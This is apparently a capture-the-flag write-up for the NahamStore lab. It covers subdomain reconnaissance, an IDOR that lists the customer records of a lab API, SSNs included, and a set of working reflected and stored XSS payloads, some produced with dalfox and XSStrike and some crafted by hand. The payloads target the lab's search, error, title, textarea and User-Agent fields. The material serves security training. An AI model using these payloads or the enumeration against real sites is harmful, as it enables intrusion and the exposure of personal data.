[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://nahamstore.thm
[http-missing-security-headers:access-control-expose-headers] [http] [info] http://nahamstore.thm
[http-missing-security-headers:access-control-allow-headers] [http] [info] http://nahamstore.thm
[http-missing-security-headers:content-security-policy] [http] [info] http://nahamstore.thm
[http-missing-security-headers:x-frame-options] [http] [info] http://nahamstore.thm
[http-missing-security-headers:x-content-type-options] [http] [info] http://nahamstore.thm
[http-missing-security-headers:referrer-policy] [http] [info] http://nahamstore.thm
[http-missing-security-headers:clear-site-data] [http] [info] http://nahamstore.thm
[openssh-detect] [network] [info] marketing.nahamstore.thm:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3]
[openssh-detect] [network] [info] shop.nahamstore.thm:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3]
[openssh-detect] [network] [info] stock.nahamstore.thm:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3]
[openssh-detect] [network] [info] nahamstore.thm:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3]
[openssh-detect] [network] [info] nahamstore-2020.nahamstore.thm:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3]
[openssh-detect] [network] [info] www.nahamstore.thm:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3]
[host-header-injection] [http] [info] http://nahamstore-2020.nahamstore.thm
[host-header-injection] [http] [info] http://marketing.nahamstore.thm
[host-header-injection] [http] [info] http://stock.nahamstore.thm
[host-header-injection] [http] [info] http://nahamstore.thm
[host-header-injection] [http] [info] http://shop.nahamstore.thm
[host-header-injection] [http] [info] http://www.nahamstore.thm
[CVE-2021-31250] [http] [medium] http://nahamstore.thm/if.cgi?B_apply=APPLY&TF_ip=443&TF_submask=0&TF_submask=%22%3E%3Cscript%3Ealert%282NHtrpBz8oCFdhpzf9K5lVG8H6t%29%3C%2Fscript%3E&failure=fail.htm&max_tcp=3&radio_ping_block=0&redirect=setting.htm&type=ap_tcps_apply
[waf-detect:shadowd] [http] [info] http://nahamstore-2020.nahamstore.thm/
[waf-detect:apachegeneric] [http] [info] http://nahamstore-2020.nahamstore.thm/
[waf-detect:nginxgeneric] [http] [info] http://nahamstore-2020.nahamstore.thm/
[waf-detect:nginxgeneric] [http] [info] http://shop.nahamstore.thm/
[waf-detect:nginxgeneric] [http] [info] http://stock.nahamstore.thm/
[waf-detect:nginxgeneric] [http] [info] http://www.nahamstore.thm/
[waf-detect:nginxgeneric] [http] [info] http://marketing.nahamstore.thm/
[waf-detect:nginxgeneric] [http] [info] http://nahamstore.thm/
[robots-txt-endpoint] [http] [info] http://nahamstore.thm/robots.txt

doing some permutations

──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ altdns -i subdomains.txt -o permutation_output -w words.txt -r -s resolved_output.txt

[*] Completed in 0:00:19

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat words.txt  
dev
test
api

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ more permutation_output 
dev-shop.nahamstore.thm.
www.nahamstoretest.thm.
shop.nahamstoreapi.thm.

removing . at the end

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat permutation_output | cut -d '.' -f 1-3 | tee -a permutation_output_final
dev-shop.nahamstore.thm
www.nahamstoretest.thm
shop.nahamstoreapi.thm
www.devnahamstore.thm
test-nahamstore-2020.nahamstore.thm
marketing.nahamstore-test.thm
nahamstore-2020.testnahamstore.thm
devshop.nahamstore.thm
apimarketing.nahamstore.thm
test-stock.nahamstore.thm
stock.nahamstore.test
stock.nahamstore.api
marketing-api.nahamstore.thm
nahamstore-2020-api.nahamstore.thm
nahamstore-2020.api.nahamstore
marketing.nahamstoretest.thm
stocktest.nahamstore.thm
nahamstore-2020.dev.nahamstore
nahamstore-2020-dev.nahamstore.thm
shop.nahamstore.dev
stock.nahamstore-test.thm
api-shop.nahamstore.thm
api-nahamstore.thm.
dev.stock.nahamstore
stock-api.nahamstore.thm
www.nahamstore.test
nahamstore-2020dev.nahamstore.thm
www.dev.nahamstore
testmarketing.nahamstore.thm
nahamstoretest.thm.
shop.apinahamstore.thm
www.testnahamstore.thm
www.api-nahamstore.thm
shop.dev-nahamstore.thm
apistock.nahamstore.thm
stockdev.nahamstore.thm
nahamstore-2020.test.nahamstore
api.stock.nahamstore
nahamstore.api.thm
wwwapi.nahamstore.thm
nahamstore-2020.nahamstore.test
devnahamstore-2020.nahamstore.thm
marketing.devnahamstore.thm
dev.marketing.nahamstore
shop.api-nahamstore.thm
devmarketing.nahamstore.thm
stock.api-nahamstore.thm
test-nahamstore.thm.
nahamstore-2020.nahamstore.api
test.nahamstore-2020.nahamstore
api-marketing.nahamstore.thm
stock-dev.nahamstore.thm
shop.nahamstoredev.thm
nahamstoreapi.thm.
nahamstore-2020.nahamstoreapi.thm
shop-dev.nahamstore.thm
shop.api.nahamstore
marketing.test.nahamstore
shopdev.nahamstore.thm
nahamstoredev.thm.
www.nahamstore.api
stock.nahamstoreapi.thm
nahamstore-2020.dev-nahamstore.thm
test.stock.nahamstore
shop.nahamstore-dev.thm
apishop.nahamstore.thm
nahamstore-2020api.nahamstore.thm
dev.nahamstore.thm
apinahamstore-2020.nahamstore.thm
shop.nahamstoretest.thm
shop.devnahamstore.thm
stock.dev-nahamstore.thm
stock.nahamstoredev.thm
testnahamstore.thm.
shop.nahamstore.test
stock.test-nahamstore.thm
shop.test-nahamstore.thm
wwwtest.nahamstore.thm
dev-nahamstore-2020.nahamstore.thm
shop-api.nahamstore.thm
nahamstore-2020.api-nahamstore.thm
www.nahamstore-test.thm
marketing.nahamstore.dev
wwwdev.nahamstore.thm
apinahamstore.thm.
dev.www.nahamstore
marketingdev.nahamstore.thm
nahamstore-2020test.nahamstore.thm
stock.nahamstore.dev
stockapi.nahamstore.thm
www-test.nahamstore.thm
test.shop.nahamstore
api.marketing.nahamstore
test.nahamstore.thm
shop.nahamstore-test.thm
nahamstore-2020.nahamstore-dev.thm
www-dev.nahamstore.thm
nahamstore-2020.test-nahamstore.thm
nahamstore-test.thm.
stock.devnahamstore.thm
dev.nahamstore-2020.nahamstore
shop.dev.nahamstore
stock.nahamstore-dev.thm
marketing.nahamstoreapi.thm
nahamstore.test.thm
dev-marketing.nahamstore.thm
api-nahamstore-2020.nahamstore.thm
stock.apinahamstore.thm
shop-test.nahamstore.thm
api.nahamstore-2020.nahamstore
api.www.nahamstore
nahamstore-2020.devnahamstore.thm
stock.nahamstore-api.thm
www.dev-nahamstore.thm
www.nahamstore-dev.thm
api-www.nahamstore.thm
marketing.nahamstore-dev.thm
marketing-test.nahamstore.thm
marketing.dev-nahamstore.thm
devstock.nahamstore.thm
nahamstore.dev.thm
stock.testnahamstore.thm
marketing.nahamstore-api.thm
nahamstore-2020.nahamstoretest.thm
shop.nahamstore-api.thm
www.nahamstoredev.thm
apiwww.nahamstore.thm
testnahamstore-2020.nahamstore.thm
marketing.test-nahamstore.thm
stock.nahamstoretest.thm
testwww.nahamstore.thm
marketingtest.nahamstore.thm
www.apinahamstore.thm
test.www.nahamstore
shop.testnahamstore.thm
nahamstore-2020.nahamstoredev.thm
test-marketing.nahamstore.thm
nahamstore-dev.thm.
api.shop.nahamstore
marketing.api-nahamstore.thm
devwww.nahamstore.thm
stock.test.nahamstore
dev-stock.nahamstore.thm
nahamstore-2020-test.nahamstore.thm
marketing.nahamstore.test
marketing.apinahamstore.thm
marketing.nahamstoredev.thm
stock.dev.nahamstore
nahamstore-2020.apinahamstore.thm
devnahamstore.thm.
shop.nahamstore.api
marketing-dev.nahamstore.thm
api.nahamstore.thm
nahamstore-2020.nahamstore-api.thm
marketing.api.nahamstore
www.nahamstore-api.thm
stock-test.nahamstore.thm
test-shop.nahamstore.thm
nahamstore-2020.nahamstore-test.thm
test.marketing.nahamstore
testshop.nahamstore.thm
marketingapi.nahamstore.thm
teststock.nahamstore.thm
shoptest.nahamstore.thm
nahamstore-api.thm.
dev-www.nahamstore.thm
nahamstore-2020.nahamstore.dev
www-api.nahamstore.thm
www.api.nahamstore
test-www.nahamstore.thm
www.test.nahamstore
stock.api.nahamstore
dev-nahamstore.thm.
dev.shop.nahamstore
shop.test.nahamstore
www.nahamstore.dev
www.nahamstoreapi.thm
marketing.testnahamstore.thm
marketing.dev.nahamstore
marketing.nahamstore.api
api-stock.nahamstore.thm
www.test-nahamstore.thm
shopapi.nahamstore.thm

first let's add to /etc/hosts if we discover another subdomain

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ tail /etc/hosts

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm
10.10.105.35 cmess.thm dev.cmess.thm server.cmess.thm sql.cmess.thm backup.cmess.thm
10.10.41.28 something.nahamstore.thm www.nahamstore.thm nahamstore.thm shop.nahamstore.thm stock.nahamstore.thm marketing.nahamstore.thm nahamstore-2020.nahamstore.thm dev-shop.nahamstore.thm www.nahamstoretest.thm nahamstore-2020-api.nahamstore.thm nahamstore-2020dev.nahamstore.thm api-shop.nahamstore.thm nahamstore-2020-dev.nahamstore.thm

I've added a few permutations 

now test with httpx-toolkit

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat permutation_output_final | httpx-toolkit -sc -title

    __    __  __       _  __
   / /_  / /_/ /_____ | |/ /
  / __ \/ __/ __/ __ \|   /
 / / / / /_/ /_/ /_/ /   |
/_/ /_/\__/\__/ .___/_/|_|
             /_/              v1.1.5

		projectdiscovery.io

Use with caution. You are responsible for your actions.
Developers assume no liability and are not responsible for any misuse or damage.
http://api-shop.nahamstore.thm [200] [NahamStore - Setup Your Hosts File]
http://dev-shop.nahamstore.thm [200] [NahamStore - Setup Your Hosts File]
http://nahamstore-2020-api.nahamstore.thm [200] [NahamStore - Setup Your Hosts File]
http://nahamstore-2020-dev.nahamstore.thm [200] []
http://nahamstore-2020dev.nahamstore.thm [200] [NahamStore - Setup Your Hosts File]
http://www.nahamstoretest.thm [200] [NahamStore - Setup Your Hosts File]

If you're reading this you need to add www.nahamstore.thm and nahamstore.thm to your hosts file pointing to something.nahamstore.thm

the same msg in 5.

Let's check http://nahamstore-2020-dev.nahamstore.thm

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ dirsearch -u http://nahamstore-2020-dev.nahamstore.thm -i200,302 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/nahamstore-2020-dev.nahamstore.thm/_23-03-20_14-32-11.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-03-20_14-32-11.log

Target: http://nahamstore-2020-dev.nahamstore.thm/

[14:32:12] Starting: 
[14:32:17] 302 -    0B  - /api  ->  /api/

Task Completed

let's take a pic :)

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat final_subdomain | aquatone         
aquatone v1.7.0 started at 2023-03-20T14:33:53-04:00

Targets    : 1
Threads    : 4
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

http://nahamstore-2020-dev.nahamstore.thm/api: 200 OK
http://nahamstore-2020-dev.nahamstore.thm/api: screenshot successful
Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2023-03-20T14:33:53-04:00
 - Finished at : 2023-03-20T14:33:56-04:00
 - Duration    : 3s

Requests:
 - Successful : 1
 - Failed     : 0

 - 2xx : 1
 - 3xx : 0
 - 4xx : 0
 - 5xx : 0

Screenshots:
 - Successful : 1
 - Failed     : 0

Wrote HTML report to: aquatone_report.html

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cd screenshots                
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ ls
http__dev_marketing__42099b4af021e53f.png
http__marketing_dev__42099b4af021e53f.png
http__marketing_nahamstore_thm__da39a3ee5e6b4b0d.png
http__nahamstore-2020-dev_nahamstore_thm__ada91241341ae792.png
http__nahamstore-2020_nahamstore_thm__da39a3ee5e6b4b0d.png
http__nahamstore_thm__da39a3ee5e6b4b0d.png
http__shop_nahamstore_thm__da39a3ee5e6b4b0d.png
https__marketing_dev__42099b4af021e53f.png
http__stock_nahamstore_thm__da39a3ee5e6b4b0d.png
http__www_nahamstore_thm__da39a3ee5e6b4b0d.png
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ eog http__nahamstore-2020-dev_nahamstore_thm__ada91241341ae792.png  

uhmm nothing interesting 

again 

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ dirsearch -u http://nahamstore-2020-dev.nahamstore.thm/api -i200,302 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/nahamstore-2020-dev.nahamstore.thm/-api_23-03-20_14-36-48.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-03-20_14-36-48.log

Target: http://nahamstore-2020-dev.nahamstore.thm/api/

[14:36:49] Starting: 
[14:37:02] 302 -    0B  - /api/customers  ->  /api/customers/

Task Completed


I see it

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ echo 'http://nahamstore-2020-dev.nahamstore.thm/api/customers' > final_subdomain
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat final_subdomain | aquatone
aquatone v1.7.0 started at 2023-03-20T14:39:02-04:00

Targets    : 1
Threads    : 4
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

http://nahamstore-2020-dev.nahamstore.thm/api/customers: 400 Bad Request
http://nahamstore-2020-dev.nahamstore.thm/api/customers: screenshot successful
Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2023-03-20T14:39:02-04:00
 - Finished at : 2023-03-20T14:39:05-04:00
 - Duration    : 3s

Requests:
 - Successful : 1
 - Failed     : 0

 - 2xx : 0
 - 3xx : 0
 - 4xx : 1
 - 5xx : 0

Screenshots:
 - Successful : 1
 - Failed     : 0

Wrote HTML report to: aquatone_report.html

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cd screenshots                
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ ls
http__dev_marketing__42099b4af021e53f.png
http__marketing_dev__42099b4af021e53f.png
http__marketing_nahamstore_thm__da39a3ee5e6b4b0d.png
http__nahamstore-2020-dev_nahamstore_thm__ada91241341ae792.png
http__nahamstore-2020-dev_nahamstore_thm__c6a7e330ca22983c.png
http__nahamstore-2020_nahamstore_thm__da39a3ee5e6b4b0d.png
http__nahamstore_thm__da39a3ee5e6b4b0d.png
http__shop_nahamstore_thm__da39a3ee5e6b4b0d.png
https__marketing_dev__42099b4af021e53f.png
http__stock_nahamstore_thm__da39a3ee5e6b4b0d.png
http__www_nahamstore_thm__da39a3ee5e6b4b0d.png
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ eog http__nahamstore-2020-dev_nahamstore_thm__c6a7e330ca22983c.png


customer_id is required

Using burp

Request

GET /api/customers/?customer_id=1 HTTP/1.1

Response

HTTP/1.1 200 OK

Server: nginx/1.14.0 (Ubuntu)

Date: Mon, 20 Mar 2023 18:43:29 GMT

Content-Type: application/json

Connection: close

Content-Length: 103

{"id":1,"name":"Rita Miles","email":"rita.miles969@gmail.com","tel":"816-719-7115","ssn":"366-24-2649"}

let's use burp intruder to get all users :) (IDOR)

GET /api/customers/?customer_id=§0§ HTTP/1.1

Payload type:numbers

From 0 to 99 and doing 1 step

{"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","tel":"501-392-5473","ssn":"521-61-6392"}

We found it Jimmy SSN

{"id":3,"name":"Charles Cook","email":"maverick1974@hotmail.com","tel":"617-776-8871","ssn":"438-92-2964"}

It seems there are only 3 users

```

Jimmy Jones SSN

_Social Security number_ (_SSN_)

*521-61-6392*

###  XSS

We've put quite a few XSS vulnerabilities into the web application. See if you can find them all and answer the questions below.  

Answer the questions below

```
http://marketing.nahamstore.thm/8d1952ba2b3c6dcd76236f090ab8642c

replace c with whatever

we found http://marketing.nahamstore.thm/?error

or using arjun

https://github.com/s0md3v/Arjun

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ arjun -u http://marketing.nahamstore.thm
    _
   /_| _ '
  (  |/ /(//) v2.2.1
      _/      

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] parameter detected: error, based on: body length
[+] Parameters found: error


http://marketing.nahamstore.thm/?error=Campaign+Not+Found

http://marketing.nahamstore.thm/?error=%3Cscript%3Ealert(document.domain)%3C/script%3E

marketing.nahamstore.thm

http://marketing.nahamstore.thm/?error=%3Cscript%3Ealert(window.origin)%3C/script%3E

http://marketing.nahamstore.thm

https://medium.com/@sherlock297/install-dalfox-on-kali-linux-fadcfc3a6634

sudo su
go install github.com/hahwul/dalfox/v2@latest

┌──(root㉿kali)-[~/go/bin]
└─# cp /root/go/bin/dalfox /usr/local/bin 

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ dalfox -h
Usage:
  dalfox [flags]
  dalfox [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  file        Use file mode(targets list or rawdata)
  help        Help about any command
  payload     Payload mode, make and enum payloads
  pipe        Use pipeline mode
  server      Start API Server
  sxss        Use Stored XSS mode
  url         Use single target mode
  version     Show version

Flags:
  -b, --blind string                Add your blind xss
                                      * Example: -b hahwul.xss.ht
      --config string               Using config from file
  -C, --cookie string               Add custom cookie
      --cookie-from-raw string      Load cookie from burp raw http request
                                      * Example: --cookie-from-raw request.txt
      --custom-alert-type string    Change alert value type
                                      * Example: --custom-alert-type=none / --custom-alert-type=str,none (default "none")
      --custom-alert-value string   Change alert value
                                      * Example: --custom-alert-value=document.cookie (default "1")
      --custom-payload string       Add custom payloads from file
  -d, --data string                 Using POST Method and add Body data
      --debug                       debug mode, save all log using -o option
      --deep-domxss                 DOM XSS Testing with more payloads on headless [so slow]
      --delay int                   Milliseconds between send to same host (1000==1s)
  -F, --follow-redirects            Following redirection
      --format string               Stdout output format
                                      * Supported: plain / json (default "plain")
      --found-action string         If found weak/vuln, action(cmd) to next
                                      * Example: --found-action='./notify.sh'
      --found-action-shell string   Select shell application for --found-action (default "bash")
      --grep string                 Using custom grepping file
                                      * Example: --grep ./samples/sample_grep.json
  -H, --header strings              Add custom headers
  -h, --help                        help for dalfox
      --ignore-param strings        Ignores this parameter when scanning.
                                      * Example: --ignore-param api_token --ignore-param csrf_token
      --ignore-return string        Ignores scanning from return code
                                      * Example: --ignore-return 302,403,404
  -X, --method string               Force overriding HTTP Method
                                      * Example: -X PUT (default "GET")
      --mining-dict                 Find new parameter with dictionary attack, default is Gf-Patterns=>XSS (default true)
  -W, --mining-dict-word string     Custom wordlist file for param mining
                                      * Example: --mining-dict-word word.txt
      --mining-dom                  Find new parameter in DOM (attribute/js value) (default true)
      --no-color                    Not use colorize
      --no-spinner                  Not use spinner
      --only-custom-payload         Only testing custom payload (required --custom-payload)
      --only-discovery              Only testing parameter analysis (same '--skip-xss-scanning' option)
      --only-poc string             Shows only the PoC code for the specified pattern (g: grep / r: reflected / v: verified)
                                     * Example: --only-poc='g,v'
  -o, --output string               Write to output file (By default, only the PoC code is saved)
      --output-all                  All log write mode (-o or stdout)
  -p, --param strings               Only testing selected parameters
      --poc-type string             Select PoC type 
                                     * Supported: plain/curl/httpie/http-request
                                     * Example: --poc-type='curl' (default "plain")
      --proxy string                Send all request to proxy server
                                      * Example: --proxy http://127.0.0.1:8080
      --remote-payloads string      Using remote payload for XSS testing
                                      * Supported: portswigger/payloadbox
                                      * Example: --remote-payloads=portswigger,payloadbox
      --remote-wordlists string     Using remote wordlists for param mining
                                      * Supported: burp/assetnote
                                      * Example: --remote-wordlists=burp
      --report                      Show detail report
      --report-format string        Format of --report flag [plain/json] (default "plain")
  -S, --silence                     Only print PoC Code and Progress(for pipe/file mode)
      --skip-bav                    Skipping BAV(Basic Another Vulnerability) analysis
      --skip-grepping               Skipping built-in grepping
      --skip-headless               Skipping headless browser base scanning[DOM XSS and inJS verify]
      --skip-mining-all             Skipping ALL parameter mining
      --skip-mining-dict            Skipping Dict base parameter mining
      --skip-mining-dom             Skipping DOM base parameter mining
      --skip-xss-scanning           Skipping XSS Scanning (same '--only-discovery' option)
      --timeout int                 Second of timeout (default 10)
      --user-agent string           Add custom UserAgent
      --waf-evasion                 Avoid blocking by adjusting the speed when detecting WAF (worker=1 delay=3s)
  -w, --worker int                  Number of worker (default 100)

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ dalfox url "http://marketing.nahamstore.thm/?error="

    _..._
  .' .::::.   __   _   _    ___ _ __ __
 :  :::::::: |  \ / \ | |  | __/ \\ V /
 :  :::::::: | o ) o || |_ | _( o )) (
 '. '::::::' |__/|_n_||___||_| \_//_n_\
   '-.::''    

🌙🦊 Powerful open source XSS scanning tool and parameter analyzer, utility

 🎯  Target                 http://marketing.nahamstore.thm/?error=
 🏁  Method                 GET
 🖥   Worker                 100
 🔦  BAV                    true
 ⛏   Mining                 true (Gf-Patterns)
 🔬  Mining-DOM             true (mining from DOM)
 ⏱   Timeout                10
 📤  FollowRedirect         false
 🕰   Started at             2023-03-20 17:31:25.136798704 -0400 EDT m=+0.087319242

 >>>>>>>>>>>>>>>>>>>>>>>>>
[*] 🦊 Start scan [SID:Single] / URL: http://marketing.nahamstore.thm/?error=
[I] Found 0 testing point in DOM base parameter mining
[I] Found 1 testing point in Dictionary base paramter mining
[I] Content-Type is text/html; charset=UTF-8
[I] Reflected error param => PTYPE: URL  Injected: /inHTML-none(1)  \  >  [  ,  -  )  `  ]  :  =  <  }  ;  {  +  "  '  |  .  $  (
    16 line:                  <p>DalFo
[W] Reflected Payload in HTML: error=<ScRipt>prompt.valueOf()(1)</script>
    16 line:                  <p><ScRipt>prompt.valueOf()(1)</script></p>
[POC][R][GET][inHTML-none(1)-URL] http://marketing.nahamstore.thm/?error=%3CScRipt%3Eprompt.valueOf%28%29%281%29%3C%2Fscript%3E
[V] Triggered XSS Payload (found DOM Object): error='><svg/class='dalfox'onLoad=alert(1)>
    16 line:                  <p>'><svg/class='dalfox'onLoad=alert(1)></p>
[POC][V][GET][inHTML-URL] http://marketing.nahamstore.thm/?error=%27%3E%3Csvg%2Fclass%3D%27dalfox%27onLoad%3Dalert%281%29%3E
[*] -------------------------------------------------------------------------------------------------
[*] [duration: 7.64803607s][issues: 2] Finish Scan!

http://marketing.nahamstore.thm/?error=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dprompt(document.domain)%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ dalfox url 'http://nahamstore.thm/search?q='        

    _..._
  .' .::::.   __   _   _    ___ _ __ __
 :  :::::::: |  \ / \ | |  | __/ \\ V /
 :  :::::::: | o ) o || |_ | _( o )) (
 '. '::::::' |__/|_n_||___||_| \_//_n_\
   '-.::''    

🌙🦊 Powerful open source XSS scanning tool and parameter analyzer, utility

 🎯  Target                 http://nahamstore.thm/search?q=
 🏁  Method                 GET
 🖥   Worker                 100
 🔦  BAV                    true
 ⛏   Mining                 true (Gf-Patterns)
 🔬  Mining-DOM             true (mining from DOM)
 ⏱   Timeout                10
 📤  FollowRedirect         false
 🕰   Started at             2023-03-20 17:40:08.418876483 -0400 EDT m=+1.320009517

 >>>>>>>>>>>>>>>>>>>>>>>>>
[*] 🦊 Start scan [SID:Single] / URL: http://nahamstore.thm/search?q=
[I] Found 0 testing point in DOM base parameter mining
[I] Found 1 testing point in Dictionary base paramter mining
[I] Content-Type is text/html; charset=UTF-8
[I] Reflected PATH '/dalfoxpathtest' => Injected: /inHTML-none(1)]
[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)/inJS-single(1)  $  {  :  "  |  }  '  `  (  \  ;  [  .  )  =  -  ,  +  ]
    38 line:      <h3 class="text-center">Search Results For "DalFox"</h3>
    52 line:      var search = 'Dal
 ⠸  [820/1731 Queries][47.37%] Testing "q" param and waiting headless2023/03/20 17:41:11 ERROR: could not retrieve document root for 291A8313829BBFE1B79358D6C75515E5: context deadline exceeded
 ⠹  [1393/1731 Queries][80.47%] Testing "q" param and waiting headless2023/03/20 17:41:49 ERROR: could not retrieve document root for 4F3E43A3A6C6B87964A4C707837659F0: context deadline exceeded
 ⠸  [1535/1731 Queries][88.68%] Testing "q" param and waiting headless2023/03/20 17:41:55 ERROR: could not retrieve document root for F387420C57D81CA612A7A4981C0BDA92: context deadline exceeded
[V] Triggered XSS Payload (found dialog in headless)d waiting headless
[POC][V][GET][inJS-single(1)-URL] http://nahamstore.thm/search?q=%27-confirm.apply%28null%2C%5B1%5D%29-%27
[V] Triggered XSS Payload (found dialog in headless)eries and waiting headless
[POC][V][GET][inJS-single(1)-URL] http://nahamstore.thm/search?q=%27%2Balert.call%28null%2C1%29%2B%27
[*] ---------------------------------------------------------------------------------------------------------------------------------
[*] [duration: 2m2.558570607s][issues: 229] Finish Scan!

'-confirm.apply(null,[document.domain])-'
http://nahamstore.thm/search?q=%27-confirm.apply(null%2C[document.domain])-%27

'+alert.call(null,document.domain)+'
http://nahamstore.thm/search?q=%27%2Balert.call(null%2Cdocument.domain)%2B%27

This is a nice tool :)

or doing manually


<script>
    var search = '';alert(document.domain)//';
    $.get('/search-products?q=' + search,function(resp){
        if( resp.length == 0 ){

            $('.product-list').html('<div class="text-center" style="margin:10px">No matching products found</div>');

        }else {
            $.each(resp, function (a, b) {
                $('.product-list').append('<div class="col-md-4">' +
                    '<div class="product_holder" style="border:1px solid #ececec;padding: 15px;margin-bottom:15px">' +
                    '<div class="image text-center"><a href="/product?id=' + b.id + '"><img class="img-thumbnail" src="/product/picture/?file=' + b.img + '.jpg"></a></div>' +
                    '<div class="text-center" style="font-size:20px"><strong><a href="/product?id=' + b.id + '">' + b.name + '</a></strong></div>' +
                    '<div class="text-center"><strong>$' + b.cost + '</strong></div>' +
                    '<div class="text-center" style="margin-top:10px"><a href="/product?id=' + b.id + '" class="btn btn-success">View</a></div>' +
                    '</div>' +
                    '</div>');
            });
        }
    });
</script>

we can do it cause we're inside <script>alert(document.domain)</script>

and we need only alert but before this need to finish

var search = '';
and // to comment all

o finally PoC will be

';alert(document.domain)//

http://nahamstore.thm/search?q=%27;alert(document.domain)//

or scaping like this to close '

http://nahamstore.thm/search?q=%27;alert(document.domain);%27

';alert(document.domain);'

using another tool but not effective like dalfox

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cd ../XSStrike 
                                                                                                                                      
┌──(witty㉿kali)-[~/bug_hunter/XSStrike]
└─$ python3 xsstrike.py -u 'http://nahamstore.thm/search?q='          

	XSStrike v3.1.5

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: q 
[!] Reflections found: 2 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <D3V%0doNMouseOvER%0d=%0d(confirm)()//v3dm0s 
[!] Efficiency: 92 
[!] Confidence: 10 
------------------------------------------------------------
[+] Payload: <A%0donmOUseOVER%0d=%0dconfirm()%0dx//v3dm0s 
[!] Efficiency: 92 
[!] Confidence: 10 

now create an acc 

http://nahamstore.thm/returns

Invalid Order Number

Please select a valid return reason

http://nahamstore.thm/register

Invalid Email Address entered

http://nahamstore.thm/account/orders/4

User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

intercept with burp

User Agent: <script>alert(document.domain)</script>

everytime will go to orders we get (stored xss)

nahamstore.thm

we need to scape title
http://nahamstore.thm/product?id=1&name=%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E//

name=</title><script>alert(1)</script>//

<title>NahamStore - </title>

Now in returns we need to scape textarea

<textarea class="form-control">&lt;h1&gt;hi&lt;/h1&gt;</textarea>

</textarea><script>alert(document.domain)</script>//

nahamstore.thm

<input placeholder="Discount Code" class="form-control" name="discount" value="">

http://nahamstore.thm/product?id=2&added=1

let's intercept

POST /product?id=2&added=1 HTTP/1.1

Host: nahamstore.thm

...

add_to_basket=1&discount=123

http://nahamstore.thm/product?id=2&added=1&discount="<script>alert(document.domain)</script>

<input placeholder="Discount Code" class="form-control" name="discount" value="" scriptalert(document.domain)="" script"="">

let's use dalfox

┌──(witty㉿kali)-[~/bug_hunter/XSStrike]
└─$ dalfox url "http://nahamstore.thm/product?id=2&added=1&discount="

    _..._
  .' .::::.   __   _   _    ___ _ __ __
 :  :::::::: |  \ / \ | |  | __/ \\ V /
 :  :::::::: | o ) o || |_ | _( o )) (
 '. '::::::' |__/|_n_||___||_| \_//_n_\
   '-.::''    

🌙🦊 Powerful open source XSS scanning tool and parameter analyzer, utility

 🎯  Target                 http://nahamstore.thm/product?id=2&added=1&discount=
 🏁  Method                 GET
 🖥   Worker                 100
 🔦  BAV                    true
